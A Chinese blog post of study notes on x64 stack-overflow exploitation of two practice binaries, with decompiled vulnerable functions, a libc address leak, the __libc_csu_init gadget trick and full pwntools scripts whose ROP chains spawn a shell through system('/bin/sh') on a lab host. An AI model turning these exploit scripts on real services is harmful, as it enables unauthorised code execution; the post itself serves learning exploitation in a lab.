---
title: "栈溢出学习笔记"
date: 2018-11-16T15:57:09+08:00
tags: ["pwn", "exploit", "stackoverflow"]
---

有一段时间没写博客了，下午跟着巨佬学了点简单的栈溢出，拿其中两个例子做下笔记 ( x64

在虚拟机里用socat把程序挂起来 `socat tcp-l:8233,fork exec:./challenge`

查找偏移的网址：https://libc.blukat.me/

也可以使用跃哥的 https://github.com/lieanu/LibcSearcher ( 用着有点卡 Orz

## 0x01

第一个例子，漏洞点当然也很明显

```c
int vulfunc()
{
  char v1; // [rsp+0h] [rbp-10h]

  puts("data:");
  gets(&v1);
  return printf("data:%s\n", &v1);
}
```

在 `gets` 这个地方存在溢出，但是程序中没有 `/bin/sh` 字符串，也没有 `system` , `execve` 等函数供我们使用，当然程序也开了NX

![](/img/pwn-stackoverflow-study/20181121212534.png)

程序中供使用的函数主要有两个 `puts` 与 `gets` ，这里可以使用 `puts` 来泄露出 libc 中 `system` 与 `/bin/sh` 字符串的地址

因为是x64的程序，所以程序传参稍微有点不一样，因为puts仅需要一个参数，所以程序中可以很快找到一个可供使用的gadgets

![](/img/pwn-stackoverflow-study/20181121212525.png)

首先使用puts来泄露出一个地址供查找，这里选择了泄露gets的地址

```python
from pwn import *

io = remote('10.211.55.33', 8233)
elf = ELF('./rop4')

context.log_level = 'DEBUG'

puts_plt = p64(elf.plt['puts'])
gets_got = p64(elf.got['gets'])
pop_rdi_addr = p64(0x400773)
vuln_func_addr = p64(0x400676)

payload = 'A' * 0x10 + pop_rdi_addr*2 + gets_got + puts_plt + vuln_func_addr
io.sendlineafter('data:', payload)
gets_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\0'))
print hex(gets_addr)
```

![](/img/pwn-stackoverflow-study/20181121212514.png)

然后使用 `0x7f5c60278d80` 这个地址去上面的网站查找一下

![](/img/pwn-stackoverflow-study/20181121212503.png)

这样就得到了 `system` 函数与 `/bin/sh` 字符串的偏移，那么就可以得到他得地址了，因为 `system` 函数也只接收一个参数，所以仍然可以继续使用 `pop rdi;ret` ，完整的exp为

```python
from pwn import *

io = remote('10.211.55.33', 8233)
elf = ELF('./rop4')

context.log_level = 'DEBUG'

puts_plt = p64(elf.plt['puts'])
gets_got = p64(elf.got['gets'])
pop_rdi_addr = p64(0x400773)
vuln_func_addr = p64(0x400676)

payload = 'A' * 0x10 + pop_rdi_addr*2 + gets_got + puts_plt + vuln_func_addr
io.sendlineafter('data:', payload)
gets_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\0'))
print hex(gets_addr)
libc_base = gets_addr - 0x06ed80
bin_sh = p64(libc_base + 0x18cd57)
system = p64(libc_base + 0x045390)
payload = 'A' * 0x10 + pop_rdi_addr*2 + bin_sh + system*2
io.sendafter('data:' , payload)
io.interactive()
```



## 0x02

这个题和上个题基本上没区别，唯一不同的地方就是 `gets` 和 `puts` 换成了 `read` 和 `write` 

`main`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  write(1, "Hello, World\n", 0xDuLL);
  vulfunc();
  return 1;
}
```

`vulfunc`

```c
ssize_t vulfunc()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL);
}
```

使用 `man 2 write` 可以发现它接收三个参数

```
SYNOPSIS
     #include <unistd.h>

     ssize_t
     pwrite(int fildes, const void *buf, size_t nbyte, off_t offset);

     ssize_t
     write(int fildes, const void *buf, size_t nbyte);

     #include <sys/uio.h>

     ssize_t
     writev(int fildes, const struct iovec *iov, int iovcnt);
```

这里的思路与上一个题一样，使用write来泄露地址，但是这里明显没有那么好用的gadgets了

![](/img/pwn-stackoverflow-study/20181121212406.png)

但是在程序中存在比较通用的组件，一般程序中都会存在的 `__libc_csu_init` 

```
text:0000000000400700
.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400700                 mov     rdx, r13
.text:0000000000400703                 mov     rsi, r14
.text:0000000000400706                 mov     edi, r15d
.text:0000000000400709                 call    qword ptr [r12+rbx*8]
.text:000000000040070D                 add     rbx, 1
.text:0000000000400711                 cmp     rbx, rbp
.text:0000000000400714                 jnz     short loc_400700
.text:0000000000400716
.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400716                 add     rsp, 8
.text:000000000040071A                 pop     rbx
.text:000000000040071B                 pop     rbp
.text:000000000040071C                 pop     r12
.text:000000000040071E                 pop     r13
.text:0000000000400720                 pop     r14
.text:0000000000400722                 pop     r15
.text:0000000000400724                 retn
.text:0000000000400724 ; } // starts at 4006C0
.text:0000000000400724 __libc_csu_init endp
```

这里可以发现，从 000000000040071A 这个地址到 0000000000400722，可以一直控制 rbx, rbp, r12, r13, r14, r15 的值

然后在 0000000000400700 中，先将 r13 赋值给了 rdx，然后将 r14 赋值给了 rsi，再将 r15 赋值给了 edi ，虽然这里是edi，但是高位一般都是0，所以相当于这里完全控制了 rdi, rsi, rdx 三个寄存器的值，而 x64 的传参顺序则是前六个参数依次保存在 RDI，RSI，RDX，RCX，R8和 R9中，还有更多的参数才会保存在栈上

往下走会发现 call 了 [r12+rbx*8]，然后给rbx+1，再判断rbx与rbp是否相等，不相等就跳回去循环，那么这里可以构造 rbx=0，rbp=1，r12=想要执行的函数地址，r15为第一个参数，r14为第二个参数，r13为第三个参数，然后继续往下会将rsp+8，然后又pop了6次，也就是 7 * 8 = 56 的长度，那么就可以开始构造rop链了

```python
from pwn import *

io = remote('10.211.55.33', 8333)
elf = ELF('./rop5')

def rop(func, arg1, arg2, arg3):
    payload = ""
    payload += 'A' * (0x80 + 8)
    payload += p64(0x40071A)
    payload += p64(0)
    payload += p64(1)
    payload += p64(func)
    payload += p64(arg3)
    payload += p64(arg2)
    payload += p64(arg1)
    payload += p64(0x400700)
    payload += 'A' * 56
    return payload

io.sendlineafter('Hello, World', rop(elf.got['write'], 0x1, elf.got['write'] ,0x8)+p64(0x400626))
write_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = write_addr - 0x0f72b0
system_addr = libc_base + 0x45390
bin_sh_addr = libc_base + 0x18cd57
pop_rdi_addr = p64(0x400723)
io.sendline('A'*(0x80+8)+pop_rdi_addr+p64(bin_sh_addr)+p64(system_addr))
io.interactive()
```